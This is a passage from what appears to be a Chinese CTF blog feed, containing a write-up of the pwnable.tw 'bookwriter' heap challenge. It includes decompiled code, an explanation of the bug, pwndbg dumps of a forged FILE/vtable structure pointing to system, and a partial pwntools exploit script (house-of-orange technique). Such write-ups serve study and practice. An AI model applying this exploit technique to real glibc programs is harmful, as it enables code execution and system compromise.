<span class="comment"># elf = ELF(&quot;./mheap&quot;,checksec=False)</span></span><br><span class="line">	main(args[<span class="string">&#x27;REMOTE&#x27;</span>])</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2022/04/10/pwnable-bookwriter/</url>
    <content><![CDATA[<h1 id="pwnable-tw-bookwriter-ubuntu16-libc-2-23"><a href="#pwnable-tw-bookwriter-ubuntu16-libc-2-23" class="headerlink" title="pwnable.tw    bookwriter            ubuntu16,libc 2.23"></a>pwnable.tw    bookwriter            ubuntu16,libc 2.23</h1><h2 id="保护："><a href="#保护：" class="headerlink" title="保护："></a>保护：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">giantbranch@ubuntu:~/Desktop/pwnabletw/BookWriter$ checksec --file=bookwriter</span><br><span class="line">[*] <span class="string">&#x27;/home/giantbranch/Desktop/pwnabletw/BookWriter/bookwriter&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>

<h2 id="主要代码："><a href="#主要代码：" class="headerlink" title="主要代码："></a>主要代码：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">giantbranch@ubuntu:~/Desktop/pwnabletw/BookWriter$ ./bookwriter </span><br><span class="line">Welcome to the BookWriter !</span><br><span class="line">Author :qqqqqqqqqqq</span><br><span class="line">----------------------</span><br><span class="line">      BookWriter      </span><br><span class="line">----------------------</span><br><span class="line"> <span class="number">1.</span> Add a page        </span><br><span class="line"> <span class="number">2.</span> View a page       </span><br><span class="line"> <span class="number">3.</span> Edit a page       </span><br><span class="line"> <span class="number">4.</span> Information       </span><br><span class="line"> <span class="number">5.</span> Exit              </span><br><span class="line">----------------------</span><br><span class="line">Your choice :^C</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to the BookWriter !&quot;</span>);</span><br><span class="line">  readname();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="keyword">switch</span> ( getnum() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">        info();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3LL</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4LL</span>:</span><br><span class="line">        updatename();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5LL</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="readname函数"><a href="#readname函数" class="headerlink" title="readname函数"></a>readname函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_400BDF</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Author :&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> readck(&amp;auther, <span class="number">64LL</span>);</span><br><span class="line">&#125;</span><br><span class="line">__int64 __fastcall <span class="title function_">readck</span><span class="params">(__int64 a1, <span class="type">unsigned</span> <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> len; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  len = _read_chk(<span class="number">0LL</span>, a1, a2, a2);</span><br><span class="line">  <span class="keyword">if</span> ( len &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;read error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(len - <span class="number">1LL</span> + a1) == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">    *(_BYTE *)(len - <span class="number">1LL</span> + a1) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="menu函数"><a href="#menu函数" class="headerlink" title="menu函数"></a>menu函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;      BookWriter      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 1. Add a page        &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 2. View a page       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 3. Edit a page       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 4. Information       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 5. Exit              &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Your choice :&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  __int64 size; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">8</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You can&#x27;t add new page anymore!&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !(&amp;ptrlist)[i] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size of page :&quot;</span>);</span><br><span class="line">  size = getnum();</span><br><span class="line">  v2 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error !&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content :&quot;</span>);</span><br><span class="line">  readck((__int64)v2, size);</span><br><span class="line">  (&amp;ptrlist)[i] = v2;</span><br><span class="line">  sizelist[i] = size;</span><br><span class="line">  ++count;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="info函数"><a href="#info函数" class="headerlink" title="info函数"></a>info函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">info</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index of page :&quot;</span>);</span><br><span class="line">  idx = getnum();</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;out of page:&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !(&amp;ptrlist)[idx] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Not found !&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Page #%u \n&quot;</span>, idx);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Content :\n%s\n&quot;</span>, (&amp;ptrlist)[idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h3><figure class="highlight v"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> edit()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  printf(<span class="string">&quot;Index of page :&quot;</span>);</span><br><span class="line">  v1 = getnum();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(<span class="string">&quot;out of page:&quot;</span>);</span><br><span class="line">    exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !(&amp;ptrlist)[v1] )</span><br><span class="line">    <span class="keyword">return</span> puts(<span class="string">&quot;Not found !&quot;</span>);</span><br><span class="line">  printf(<span class="string">&quot;Content:&quot;</span>);</span><br><span class="line">  readck((__int64)(&amp;ptrlist)[v1], sizelist[v1]);</span><br><span class="line">  sizelist[v1] = strlen((&amp;ptrlist)[v1]);        <span class="comment">// 更新size，但是，readck不会加设空结尾，不对齐输入，可以造成溢出1字节</span></span><br><span class="line">  <span class="keyword">return</span> puts(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里虽然会更新size，但是如果我们读入的text，刚好填充chunk的用户区，但是结尾不是’\x00’，更新长度的时候，会把下一个堆块的size算进去。造成溢出，如果是topchunk_size溢出会更多</p>
<h3 id="updatename函数"><a href="#updatename函数" class="headerlink" title="updatename函数"></a>updatename函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">updatename</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Author : %s\n&quot;</span>, auther);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Page : %u\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)count);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Do you want to change the author ? (yes:1 / no:0) &quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">    readnum();</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>程序的一的大漏洞就是对于输入的字符串只会检查换行符，而不会见擦汗输入是否有结束符，输入name的时候，党字符串长度为64时，就会接上gptr,导致堆地址泄露。</p>
<p>程序没有free，如何泄露libc？</p>
<p>add时，判断错误，会导致读入第九个在sizelist的位置，所以修改sizelist[0]的大小为0，readck允许读入为0。导致再次edit ptrlist[0]时读入很大数据溢出。修改topchunk：</p>
<p>edit时，对于非对齐输入，会造成溢出，将下一个堆块的size，计入当前堆块content的size，topchunk溢出3字节，其他堆块溢出1字节。通过三字节的溢出将topchunk变得很小。</p>
<p><em>updatename的时候使用了scnaf(“%d”)，这有点奇怪，因为scanf需要用到堆空间来处理缓存：（这里没有任何利用价值）：</em></p>
<p>关键还是在于修改topchunk ,党topchunk_size 小于申请的空间大小时，会释放topchunk进入unsortedbins,这样就会造成libc及地址的泄露。</p>
<p>当我们已经申请了8个page，如果size[0]&#x3D;&#x3D;0，就可以绕过检查，额外申请出来一个page，将地址返回写道size[0]，那么，再次edit ptrlist[0]时，就可以实现溢出，（因为地址很大，足够溢出）</p>
<p>同时，更新comment的长度依旧是检查空字符，所以可以使的更新后对应的size为0，导致第九个指针变量为0，可以继续申请堆块，这个可以重复利用。</p>
<p>如此，旧的topchunk 在unsortedbins里面，修改其bk指针，利用unsortedbins attack实现任意地址写大数据（main_arena+88），</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p _IO_list_all</span><br><span class="line">$<span class="number">1</span> = (<span class="keyword">struct</span> _IO_FILE_plus *) <span class="number">0x7f7ba0e31540</span> &lt;_IO_2_1_stderr_&gt;</span><br><span class="line"><span class="comment">//payload = b&#x27;/bin/sh\x00&#x27;+p64(0x61)+p64(main_arena)+p64(list_all-0x10)+p64(2)+p64(3)</span></span><br><span class="line">pwndbg&gt; p _IO_list_all</span><br><span class="line">$<span class="number">2</span> = (<span class="keyword">struct</span> _IO_FILE_plus *) <span class="number">0x7f7ba0e30b78</span> &lt;main_arena+<span class="number">88</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>下面很巧妙的东西来了，我们伪造_IO_list_all的数据为main_arena+88,那么原本_  _chain指向下一个file结构体，结果fakeFIlede 的chain就是smallbins的入口马志翔里面的第一个chunk。所以我们将unsortedbin里面的topchunk的size变小，就会进入smallbin，然后fakefile_chain –&gt;topchunk，我们利用溢出将topchunk伪造成另一个fakefile2，并伪造vtable。伪造fakefile2要注意， flag写入的是‘&#x2F;bin&#x2F;sh\x00’ , 因为vtable里面的函数大多会以flag作为自己的参数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> _IO_FILE_plus *) <span class="number">0x7f7ba0e30b78</span>   &lt;main_arena+<span class="number">88</span>&gt; <span class="comment">//伪造的第一个fakefile</span></span><br><span class="line">$<span class="number">3</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">17100832</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x102c2c0</span> <span class="string">&quot;/bin/sh&quot;</span>, </span><br><span class="line">    _IO_read_end = <span class="number">0x102c2c0</span> <span class="string">&quot;/bin/sh&quot;</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x7f7ba0e31510</span> <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x7f7ba0e30b88</span> &lt;main_arena+<span class="number">104</span>&gt; <span class="string">&quot;\300\302\002\001&quot;</span>, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x7f7ba0e30b88</span> &lt;main_arena+<span class="number">104</span>&gt; <span class="string">&quot;\300\302\002\001&quot;</span>, </span><br><span class="line">    _IO_write_end = <span class="number">0x7f7ba0e30b98</span> &lt;main_arena+<span class="number">120</span>&gt; <span class="string">&quot;\210\v\343\240&#123;\177&quot;</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x7f7ba0e30b98</span> &lt;main_arena+<span class="number">120</span>&gt; <span class="string">&quot;\210\v\343\240&#123;\177&quot;</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x7f7ba0e30ba8</span> &lt;main_arena+<span class="number">136</span>&gt; <span class="string">&quot;\230\v\343\240&#123;\177&quot;</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x7f7ba0e30ba8</span> &lt;main_arena+<span class="number">136</span>&gt; <span class="string">&quot;\230\v\343\240&#123;\177&quot;</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x7f7ba0e30bb8</span> &lt;main_arena+<span class="number">152</span>&gt; <span class="string">&quot;\250\v\343\240&#123;\177&quot;</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x7f7ba0e30bb8</span> &lt;main_arena+<span class="number">152</span>&gt; <span class="string">&quot;\250\v\343\240&#123;\177&quot;</span>, </span><br><span class="line">    _markers = <span class="number">0x102c2c0</span>, </span><br><span class="line">    _chain = <span class="number">0x102c2c0</span>, </span><br><span class="line">    _fileno = <span class="number">-1595733032</span>, </span><br><span class="line">    _flags2 = <span class="number">32635</span>, </span><br><span class="line">    _old_offset = <span class="number">140168956939224</span>, </span><br><span class="line">    _cur_column = <span class="number">3048</span>, </span><br><span class="line">    _vtable_offset = <span class="number">-29</span> <span class="string">&#x27;\343&#x27;</span>, </span><br><span class="line">    _shortbuf = <span class="string">&quot;\240&quot;</span>, </span><br><span class="line">    _lock = <span class="number">0x7f7ba0e30be8</span> &lt;main_arena+<span class="number">200</span>&gt;, </span><br><span class="line">    _offset = <span class="number">140168956939256</span>, </span><br><span class="line">    _codecvt = <span class="number">0x7f7ba0e30bf8</span> &lt;main_arena+<span class="number">216</span>&gt;, </span><br><span class="line">    _wide_data = <span class="number">0x7f7ba0e30c08</span> &lt;main_arena+<span class="number">232</span>&gt;, </span><br><span class="line">    _freeres_list = <span class="number">0x7f7ba0e30c08</span> &lt;main_arena+<span class="number">232</span>&gt;, </span><br><span class="line">    _freeres_buf = <span class="number">0x7f7ba0e30c18</span> &lt;main_arena+<span class="number">248</span>&gt;, </span><br><span class="line">    __pad5 = <span class="number">140168956939288</span>, </span><br><span class="line">    _mode = <span class="number">-1595732952</span>, </span><br><span class="line">    _unused2 = <span class="string">&quot;&#123;\177\000\000(\f\343\240&#123;\177\000\000\070\f\343&quot;</span>...</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0x7f7ba0e30c38</span> &lt;main_arena+<span class="number">280</span>&gt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//bins</span></span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x102c2c0</span> —▸ <span class="number">0x7f7ba0e30bc8</span> (main_arena+<span class="number">168</span>) ◂— <span class="number">0x102c2c0</span></span><br><span class="line">    </span><br><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> _IO_FILE_plus *) <span class="number">0x102c2c0</span>				<span class="comment">//fakefile2</span></span><br><span class="line">$<span class="number">4</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">1852400175</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x61</span> &lt;error: Cannot access memory at address <span class="number">0x61</span>&gt;, </span><br><span class="line">    _IO_read_end = <span class="number">0x7f7ba0e30bc8</span> &lt;main_arena+<span class="number">168</span>&gt; <span class="string">&quot;\270\v\343\240&#123;\177&quot;</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x7f7ba0e30bc8</span> &lt;main_arena+<span class="number">168</span>&gt; <span class="string">&quot;\270\v\343\240&#123;\177&quot;</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x2</span> &lt;error: Cannot access memory at address <span class="number">0x2</span>&gt;, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x3</span> &lt;error: Cannot access memory at address <span class="number">0x3</span>&gt;, </span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0x0</span>, </span><br><span class="line">    _fileno = <span class="number">0</span>, </span><br><span class="line">    _flags2 = <span class="number">0</span>, </span><br><span class="line">    _old_offset = <span class="number">0</span>, </span><br><span class="line">    _cur_column = <span class="number">0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>, </span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _lock = <span class="number">0x0</span>, </span><br><span class="line">    _offset = <span class="number">0</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0</span>, </span><br><span class="line">    _mode = <span class="number">-1</span>, </span><br><span class="line">    _unused2 = <span class="string">&quot;\377\377\377\377&quot;</span>, <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">15</span> times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0x102c3a0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//伪造的vtable</span></span><br><span class="line">pwndbg&gt; p *(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *) <span class="number">0x102c3a0</span></span><br><span class="line">$<span class="number">8</span> = &#123;</span><br><span class="line">  __dummy = <span class="number">0</span>, </span><br><span class="line">  __dummy2 = <span class="number">0</span>, </span><br><span class="line">  __finish = <span class="number">0x1</span>, </span><br><span class="line">  __overflow = <span class="number">0x7f7ba0ab13a0</span> &lt;__libc_system&gt;, </span><br><span class="line">  __underflow = <span class="number">0x0</span>, </span><br><span class="line">  __uflow = <span class="number">0x0</span>, </span><br><span class="line">  __pbackfail = <span class="number">0x0</span>, </span><br><span class="line">  __xsputn = <span class="number">0x0</span>, </span><br><span class="line">  __xsgetn = <span class="number">0x0</span>, </span><br><span class="line">  __seekoff = <span class="number">0x0</span>, </span><br><span class="line">  __seekpos = <span class="number">0x0</span>, </span><br><span class="line">  __setbuf = <span class="number">0x0</span>, </span><br><span class="line">  __sync = <span class="number">0x0</span>, </span><br><span class="line">  __doallocate = <span class="number">0x0</span>, </span><br><span class="line">  __read = <span class="number">0x0</span>, </span><br><span class="line">  __write = <span class="number">0x0</span>, </span><br><span class="line">  __seek = <span class="number">0x0</span>, </span><br><span class="line">  __close = <span class="number">0x0</span>, </span><br><span class="line">  __stat = <span class="number">0x0</span>, </span><br><span class="line">  __showmanyc = <span class="number">0x0</span>, </span><br><span class="line">  __imbue = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>下面要考虑的就是如何出发伪造的vtable。首先我们这里的fakefile2取代了stdout，所以当程序报错的输出信息时，会调用 over_flow，我们在伪造的vtable对应位置写入system。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">r=process(<span class="string">&#x27;./bookwriter&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./bookwriter&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;</span>)</span><br><span class="line">cnt = <span class="number">0x602040</span></span><br><span class="line">name = <span class="number">0x602060</span>				<span class="comment">#size=64</span></span><br><span class="line">gp = <span class="number">0x6020A0</span>				</span><br><span class="line">gs = <span class="number">0x6020E0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ch</span>(<span class="params">i</span>):</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">thename</span>(<span class="params">text</span>):</span><br><span class="line">	r.sendafter(<span class="string">&quot;Author :&quot;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,text</span>):</span><br><span class="line">	ch(<span class="number">1</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;Size of page :&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	r.sendafter(<span class="string">&quot;Content :&quot;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">	ch(<span class="number">2</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;Index of page :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,text</span>):</span><br><span class="line">	ch(<span class="number">3</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;Index of page :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	r.sendafter(<span class="string">&quot;Content:&quot;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">updatename</span>(<span class="params">i,name=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">	ch(<span class="number">4</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;Do you want to change the author ? (yes:1 / no:0) &quot;</span>,i)</span><br><span class="line">	<span class="keyword">if</span> i==<span class="string">&quot;1&quot;</span>:</span><br><span class="line">		thename(name)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">gdb.attach(r,<span class="string">&#x27;b malloc&#x27;</span>)</span><br><span class="line">thename(<span class="string">b&quot;A&quot;</span>*<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line"><span class="comment">#now the size0 is 0x20+3,wocan overflow 3 bytes</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x18</span>+p32(<span class="number">0xfe1</span>)+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">ch(<span class="number">4</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;A&quot;</span>*<span class="number">0x40</span>)</span><br><span class="line">heap_addr = u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Do you want to change the author ? (yes:1 / no:0) &quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	add(<span class="number">0x50</span>,<span class="string">&quot;AAAAAAAA&quot;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;A&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">main_arena = u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libcbase = main_arena - <span class="number">0x3c4b78</span></span><br><span class="line">list_all = <span class="number">0x3c5520</span>+libcbase</span><br><span class="line">system =libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;main_arena : &quot;</span>,<span 